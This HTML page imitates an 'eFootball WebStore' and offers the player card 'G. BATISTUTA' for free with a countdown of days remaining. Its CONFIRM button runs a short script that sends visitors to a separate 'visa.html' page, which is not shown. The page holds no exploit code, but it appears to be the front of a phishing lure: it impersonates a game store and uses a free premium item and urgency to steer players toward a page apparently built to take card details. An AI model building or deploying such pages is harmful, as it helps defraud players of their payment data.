<html lang="en"><head><style>body {transition: opacity ease-in 0.2s; } 
body[unresolved] {opacity: 0; display: block; overflow: hidden; position: relative; } 
</style>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>eFootball Player | Gabriel Batistuta</title>
    <link rel="icon" type="image/png" href="webstore.png">
    <style>
        :root {
            --ef-blue: #0046ad;
            --ef-yellow: #fff200;
            --ef-dark: #0a0e17;
            --ef-card: #161d2b;
            --ef-neon: #00ff88;
        }

        body {
            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background-color: var(--ef-dark);
            color: white;
            margin: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 100vh;
        }

        /* Navbar */
        nav {
            width: 100%;
            padding: 20px 0;
            background: rgba(0, 0, 0, 0.5);
            text-align: center;
            border-bottom: 2px solid var(--ef-blue);
            margin-bottom: 40px;
        }

        .logo-text {
            font-size: 24px;
            font-weight: 800;
            font-style: italic;
            letter-spacing: 2px;
        }

        .logo-text span {
            color: var(--ef-yellow);
        }

        /* Header */
        header {
            text-align: center;
            margin-bottom: 30px;
        }

        header h1 {
            font-size: 2.5rem;
            margin: 0;
            text-shadow: 0 0 20px rgba(0, 70, 173, 0.8);
        }

        header p {
            color: #aaa;
            font-size: 1.1rem;
        }

        /* Shop Container */
        .shop-container {
            display: flex;
            justify-content: center;
            width: 90%;
            max-width: 400px;
            max-height: 350px;
            padding-bottom: 50px;
        }

        /* Player Card */
        .player-card {
            background-color: var(--ef-card);
            border-radius: 20px;
            padding: 40px;
            text-align: center;
            border: 2px solid rgba(255, 242, 0, 0.1);
            transition: all 0.3s ease;
            position: relative;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
        }

        .player-card:hover {
            transform: scale(1.00);
            border-color: var(--ef-yellow);
            box-shadow: 0 0 30px rgba(255, 242, 0, 0.2);
        }

        .player-img {
            width: 100%;
            max-width: 240px;
            height: auto;
            border-radius: 10px;
            margin-bottom: 20px;
            filter: drop-shadow(0 0 15px rgba(255, 242, 0, 0.3));
        }

        .player-name {
            font-size: 2rem;
            font-weight: bold;
            margin: 10px 0;
            letter-spacing: 1px;
        }

        .player-role {
            color: #aaa;
            text-transform: uppercase;
            font-size: 0.9rem;
            margin-bottom: 15px;
            display: block;
        }

        .price-tag {
            color: var(--ef-neon);
            font-size: 2rem;
            font-weight: 800;
            margin-bottom: 25px;
        }

        .buy-btn {
            background-color: var(--ef-yellow);
            color: black;
            border: none;
            padding: 15px 30px;
            border-radius: 8px;
            font-weight: 900;
            text-transform: uppercase;
            cursor: pointer;
            width: 100%;
            font-size: 1.1rem;
            transition: transform 0.1s, background 0.2s;
        }

        .buy-btn:hover {
            background-color: #e6da00;
            transform: translateY(-2px);
        }

        .buy-btn:active {
            transform: translateY(1px);
        }

        /* Responsive */
        @media (max-width: 500px) {
            header h1 { font-size: 1.8rem; }
            .player-card { padding: 25px; }
        }
    </style>
</head>
<body>

    <nav>
        <div class="logo-text">eFootball <span>WebStore</span></div>
    </nav>

    <header>
        <h1>159 Days remaining</h1>
        <p></p>
    </header>

    <div class="shop-container">
        <div class="player-card">
          <span class="player-role">CF</span>
            <img src="bastituta.png" alt="Gabriel Batistuta" class="player-img">
            
            
            <div class="player-name">G. BATISTUTA</div>
            
            <div class="price-tag">FREE</div>
            
            <button class="buy-btn" onclick="redirectToVisa()">CONFIRM</button>
            <p color="white">For All Countries</p>
        </div>
    </div>

    <script>
        function redirectToVisa() {
            console.log("Processing legend purchase...");
            // Make sure visa.html exists in your directory
            window.location.href = "visa.html";
        }
    </script>
